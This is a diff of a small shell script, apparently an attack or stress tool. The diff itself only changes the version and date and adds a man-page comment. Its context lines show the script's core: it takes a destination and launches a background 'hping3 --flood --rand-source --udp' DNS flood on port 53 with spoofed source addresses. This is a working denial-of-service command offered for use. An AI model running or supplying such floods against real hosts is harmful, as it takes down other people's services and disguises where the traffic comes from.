@@ -1,7 +1,7 @@
 #!/bin/sh
 # Christopher Gray
-# Version 0.2.19
-#  2/26/2020
+# Version 0.2.20
+#  3/9/2020
 
 if [ -z "$1" ]; then
       echo "No dest defined to attack! please define one before continuing \r\n"
@@ -12,6 +12,9 @@ else
 fi
 
 #---- Hping3 Attacks --------------------------------------------------------------------------------------------------
+# Man page:  https://linux.die.net/man/8/hping3
+
+
 echo "Running HPing3 DNS flood attack script, toward port 53, from random sources... \r\n "
 sudo hping3 --flood --rand-source --udp -p 53 $server_ip 2> /dev/null &
 
